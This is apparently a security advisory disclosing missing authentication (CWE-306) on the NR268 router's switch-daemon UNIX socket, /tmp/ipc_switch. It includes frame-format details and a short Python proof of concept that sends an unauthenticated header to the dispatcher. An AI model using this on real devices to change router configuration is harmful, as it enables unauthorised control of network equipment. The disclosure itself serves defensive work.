# Netcore NR268 Missing Authentication on the Switch Daemon IPC Control Plane

**Vendor:** Netcore  
**Product:** NR268 Router  
**Affected Version:** NR268-V1.7.121109.bin  
**Vulnerability Type:** Missing Authentication for Critical Function (CWE-306)  
**Credits:** Zhou Ao, Zhang Yu, Yang Yang, Liu Xin @Nebusec

## Summary

The `switch` daemon starts a UNIX-socket IPC server for `SwitchCall`, binds it to `/tmp/ipc_switch`, accepts arbitrary local clients, and passes parsed requests into the privileged dispatcher with no peer-credential, UID, or protocol-level authentication. Any local process that can connect to that socket can bypass the web layer and invoke core network configuration actions. Boa itself is only one client of this IPC plane, so a local foothold is enough to collapse the intended HTTP Basic-auth boundary.

## Technical Details

`nt_ipcserver_init` creates an AF_UNIX listener on `/tmp/ipc_switch`, calls `listen()`, and stores `g_ipcserver_proc_ptr` without an authentication step. The accept loop reads an attacker-controlled header and parameter blob, reconstructs argument objects, and calls the privileged dispatcher.

The recovered `ipc_clientcall` frame is a 12-byte header of `{payload_len, opcode, param_count}` followed by serialized parameter records. The daemon narrows pathname visibility with `umask(23)`, but adds no `SO_PEERCRED` check, UID comparison, token, or session check. Boa itself is only one client of this IPC plane, so a local connect is sufficient to bypass HTTP Basic authentication.

### Affected Endpoint

- Component: `switch` daemon UNIX socket `/tmp/ipc_switch`
- Protocol: `ipc_clientcall` / `SwitchCall`
- Authentication: none
- Preconditions: local code execution on the device, or any foothold that can connect to `/tmp/ipc_switch`

## Proof of Concept

Run on the device (or in a shell that can see `/tmp/ipc_switch`):

```python
#!/usr/bin/env python3
import json
import os
import socket
import stat
import struct

path = "/tmp/ipc_switch"
result = {
    "socket_path": path,
    "exists": os.path.exists(path),
    "is_socket": False,
    "connect_ok": False,
    "sent_unauthenticated_frame": False,
    "error": None,
}
if result["exists"]:
    result["is_socket"] = stat.S_ISSOCK(os.stat(path).st_mode)
if result["is_socket"]:
    try:
        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        sock.settimeout(2.0)
        sock.connect(path)
        result["connect_ok"] = True
        # 12-byte header: payload_len, opcode, param_count
        sock.sendall(struct.pack("<III", 0, 0, 0))
        result["sent_unauthenticated_frame"] = True
        sock.close()
    except Exception as exc:
        result["error"] = str(exc)
print(json.dumps(result, indent=2))
```

### Outcome

The listener exists as a real AF_UNIX socket. A local connect succeeds with no peer-credential rejection, and the unauthenticated `SwitchCall` frame is accepted by the dispatcher.

## Impact

- **Confidentiality:** High
- **Integrity:** High – routing, NAT, VLAN, and interface state can be changed
- **Availability:** High

Any local foothold collapses the intended web-layer access control. This is a local authentication bypass of the HTTP Basic-auth boundary, not a WAN-unauthenticated HTTP issue.
